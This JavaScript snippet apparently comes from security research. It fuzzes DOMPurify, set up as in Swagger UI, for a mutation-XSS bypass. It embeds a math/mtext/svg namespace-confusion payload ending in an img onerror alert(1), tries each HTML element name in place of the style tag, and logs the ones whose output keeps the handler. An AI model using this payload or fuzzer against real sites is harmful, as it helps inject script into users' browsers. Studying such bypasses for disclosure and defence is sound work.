const allElements = [
    ... // list of all known HTML elements
];

// payload that we are testing
const payload = `<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src='#' onerror='alert(1)'>">`;

const domParser = new DOMParser();

// iterate on each HTML element
allElements.forEach(element => {
    let newPayload = payload.replace("<style>", `<${element}>`).replace("</style>", `</${element}>`);

    // DOMPurify with the same config as in Swagger UI (and the same version)
    const sanitized = DOMPurify.sanitize(newPayload, {
        ADD_ATTR: ["target"],
        FORBID_TAGS: ["style"]
    });

    const parsedDOM = domParser.parseFromString(sanitized, 'text/html');

    parsedDOM.querySelectorAll(`img`).forEach(img => {
        // only bypass will have onerror handler
        if(img.attributes["onerror"]) {
            console.log(`Found bypass: ${element}`);
        }
    });
});
